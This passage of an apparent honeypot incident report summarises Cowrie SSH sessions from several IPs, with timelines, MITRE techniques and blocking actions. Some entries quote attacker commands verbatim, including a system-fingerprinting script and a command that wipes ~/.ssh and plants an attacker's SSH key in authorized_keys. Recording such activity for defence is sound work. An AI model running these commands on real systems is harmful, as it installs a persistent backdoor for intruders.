| `2026-07-10 12:57:13` | `cowrie.command.success` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:13` | `cowrie.command.input` |
| `2026-07-10 12:57:14` | `cowrie.log.closed` |
| `2026-07-10 12:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a44cf5b05d5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 12:57 |
| **Last Seen** | 2026-07-10 12:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:57:31` | `cowrie.session.connect` |
| `2026-07-10 12:57:32` | `cowrie.client.version` |
| `2026-07-10 12:57:32` | `cowrie.client.kex` |
| `2026-07-10 12:57:39` | `cowrie.login.success` |
| `2026-07-10 12:57:42` | `cowrie.session.params` |
| `2026-07-10 12:57:42` | `cowrie.command.input` |
| `2026-07-10 12:57:44` | `cowrie.log.closed` |
| `2026-07-10 12:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c996693466

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:58 |
| **Last Seen** | 2026-07-10 12:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:58:25` | `cowrie.session.connect` |
| `2026-07-10 12:58:25` | `cowrie.client.version` |
| `2026-07-10 12:58:25` | `cowrie.client.kex` |
| `2026-07-10 12:58:27` | `cowrie.login.success` |
| `2026-07-10 12:58:28` | `cowrie.session.params` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.success` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.command.input` |
| `2026-07-10 12:58:28` | `cowrie.log.closed` |
| `2026-07-10 12:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-587afe209bfb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:59 |
| **Last Seen** | 2026-07-10 12:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:59:38` | `cowrie.session.connect` |
| `2026-07-10 12:59:38` | `cowrie.client.version` |
| `2026-07-10 12:59:38` | `cowrie.client.kex` |
| `2026-07-10 12:59:39` | `cowrie.login.success` |
| `2026-07-10 12:59:41` | `cowrie.session.params` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.success` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.command.input` |
| `2026-07-10 12:59:41` | `cowrie.log.closed` |
| `2026-07-10 12:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2089864930fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:00 |
| **Last Seen** | 2026-07-10 13:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:00:54` | `cowrie.session.connect` |
| `2026-07-10 13:00:54` | `cowrie.client.version` |
| `2026-07-10 13:00:54` | `cowrie.client.kex` |
| `2026-07-10 13:00:55` | `cowrie.login.success` |
| `2026-07-10 13:00:56` | `cowrie.session.params` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.success` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.command.input` |
| `2026-07-10 13:00:56` | `cowrie.log.closed` |
| `2026-07-10 13:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94a50b08f426

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:02 |
| **Last Seen** | 2026-07-10 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:02:09` | `cowrie.session.connect` |
| `2026-07-10 13:02:09` | `cowrie.client.version` |
| `2026-07-10 13:02:09` | `cowrie.client.kex` |
| `2026-07-10 13:02:10` | `cowrie.login.success` |
| `2026-07-10 13:02:11` | `cowrie.session.params` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.success` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.command.input` |
| `2026-07-10 13:02:11` | `cowrie.log.closed` |
| `2026-07-10 13:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316ba2f20aa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:03 |
| **Last Seen** | 2026-07-10 13:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:03:24` | `cowrie.session.connect` |
| `2026-07-10 13:03:24` | `cowrie.client.version` |
| `2026-07-10 13:03:24` | `cowrie.client.kex` |
| `2026-07-10 13:03:25` | `cowrie.login.success` |
| `2026-07-10 13:03:26` | `cowrie.session.params` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.success` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:26` | `cowrie.command.input` |
| `2026-07-10 13:03:27` | `cowrie.log.closed` |
| `2026-07-10 13:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8c2e198a43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:04 |
| **Last Seen** | 2026-07-10 13:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:04:39` | `cowrie.session.connect` |
| `2026-07-10 13:04:39` | `cowrie.client.version` |
| `2026-07-10 13:04:39` | `cowrie.client.kex` |
| `2026-07-10 13:04:41` | `cowrie.login.success` |
| `2026-07-10 13:04:42` | `cowrie.session.params` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.success` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.command.input` |
| `2026-07-10 13:04:42` | `cowrie.log.closed` |
| `2026-07-10 13:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3264cc1bb56f

| Field | Detail |
|---|---|
| **Source IP** | `160.119.69[.]14` |
| **First Seen** | 2026-07-10 13:05 |
| **Last Seen** | 2026-07-10 13:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:05:17` | `cowrie.session.connect` |
| `2026-07-10 13:05:17` | `cowrie.client.version` |
| `2026-07-10 13:05:17` | `cowrie.client.kex` |
| `2026-07-10 13:05:17` | `cowrie.login.success` |
| `2026-07-10 13:05:18` | `cowrie.session.params` |
| `2026-07-10 13:05:18` | `cowrie.command.input` |
| `2026-07-10 13:05:18` | `cowrie.command.failed` |
| `2026-07-10 13:05:18` | `cowrie.log.closed` |
| `2026-07-10 13:05:19` | `cowrie.session.params` |
| `2026-07-10 13:05:19` | `cowrie.command.input` |
| `2026-07-10 13:05:19` | `cowrie.session.file_download` |
| `2026-07-10 13:05:19` | `cowrie.log.closed` |
| `2026-07-10 13:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.69[.]14` to AbuseIPDB if not already reported
- [ ] Block `160.119.69[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b6555121fd

| Field | Detail |
|---|---|
| **Source IP** | `160.119.69[.]14` |
| **First Seen** | 2026-07-10 13:05 |
| **Last Seen** | 2026-07-10 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:05:19` | `cowrie.session.connect` |
| `2026-07-10 13:05:19` | `cowrie.client.version` |
| `2026-07-10 13:05:19` | `cowrie.client.kex` |
| `2026-07-10 13:05:20` | `cowrie.login.success` |
| `2026-07-10 13:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.69[.]14` to AbuseIPDB if not already reported
- [ ] Block `160.119.69[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb367d9d3a2

| Field | Detail |
|---|---|
| **Source IP** | `160.119.69[.]14` |
| **First Seen** | 2026-07-10 13:05 |
| **Last Seen** | 2026-07-10 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:05:20` | `cowrie.session.connect` |
| `2026-07-10 13:05:20` | `cowrie.client.version` |
| `2026-07-10 13:05:20` | `cowrie.client.kex` |
| `2026-07-10 13:05:20` | `cowrie.login.success` |
| `2026-07-10 13:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.69[.]14` to AbuseIPDB if not already reported
- [ ] Block `160.119.69[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2d4a71495e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:05 |
| **Last Seen** | 2026-07-10 13:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:05:52` | `cowrie.session.connect` |
| `2026-07-10 13:05:52` | `cowrie.client.version` |
| `2026-07-10 13:05:52` | `cowrie.client.kex` |
| `2026-07-10 13:05:53` | `cowrie.login.success` |
| `2026-07-10 13:05:54` | `cowrie.session.params` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.success` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:54` | `cowrie.command.input` |
| `2026-07-10 13:05:55` | `cowrie.log.closed` |
| `2026-07-10 13:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d4e1009c7b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 13:07 |
| **Last Seen** | 2026-07-10 13:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:07:06` | `cowrie.session.connect` |
| `2026-07-10 13:07:06` | `cowrie.client.version` |
| `2026-07-10 13:07:06` | `cowrie.client.kex` |
| `2026-07-10 13:07:07` | `cowrie.login.success` |
| `2026-07-10 13:07:08` | `cowrie.session.params` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.success` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:08` | `cowrie.command.input` |
| `2026-07-10 13:07:09` | `cowrie.log.closed` |
| `2026-07-10 13:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-393c35f23c83

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 13:07 |
| **Last Seen** | 2026-07-10 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:07:10` | `cowrie.session.connect` |
| `2026-07-10 13:07:10` | `cowrie.client.version` |
| `2026-07-10 13:07:10` | `cowrie.client.kex` |
| `2026-07-10 13:07:10` | `cowrie.login.success` |
| `2026-07-10 13:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34e9eafeb71

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 13:07 |
| **Last Seen** | 2026-07-10 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:07:10` | `cowrie.session.connect` |
| `2026-07-10 13:07:10` | `cowrie.client.version` |
| `2026-07-10 13:07:10` | `cowrie.client.kex` |
| `2026-07-10 13:07:10` | `cowrie.login.success` |
| `2026-07-10 13:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4870d1bdd1c7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 13:07 |
| **Last Seen** | 2026-07-10 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:07:16` | `cowrie.session.connect` |
| `2026-07-10 13:07:16` | `cowrie.client.version` |
| `2026-07-10 13:07:16` | `cowrie.client.kex` |
| `2026-07-10 13:07:16` | `cowrie.login.success` |
| `2026-07-10 13:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba8fa9fcf8a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 13:07 |
| **Last Seen** | 2026-07-10 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 13:07:17` | `cowrie.session.connect` |
| `2026-07-10 13:07:17` | `cowrie.client.version` |
| `2026-07-10 13:07:17` | `cowrie.client.kex` |
| `2026-07-10 13:07:17` | `cowrie.login.success` |
| `2026-07-10 13:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8228be0aa462

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 13:07 |
| **Last Seen** | 2026-07-10 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
